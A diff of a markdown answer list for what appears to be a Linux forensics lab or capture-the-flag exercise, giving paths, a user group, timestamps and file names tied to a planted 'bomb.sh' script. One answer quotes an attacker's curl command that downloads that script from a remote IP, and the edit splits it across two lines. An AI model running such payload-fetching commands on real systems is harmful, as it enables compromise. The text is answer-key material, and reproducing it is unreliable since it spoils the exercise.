@@ -6,59 +6,15 @@
 
 ```
 Answer: /usr/bin/apt install dokuwiki
-```
-
-
-
-```
 Answer: /home/cybert
-```
-
-
-
-```
 Answer: it-admin
-```
-
-
-
-```
 Answer: Dec 28 06:27:34
-```
-
-
-
-```
 Answer: bomb.sh
-```
-
-
-
-```
-Answer: curl 10.10.158.38:8080/bomb.sh --output bomb.sh
-```
-
-
-
-```
+Answer: curl 10.10.158.38:
+8080/bomb.sh --output bomb.sh
 Answer: /bin/os-update.sh
-```
-
-
-
-```
 Answer: Dec 28 06:29
-```
-
-
-
-```
 Answer: goodbye.txt
-```
-
-
-
-```
 Answer: 08:00 AM
 ```
 
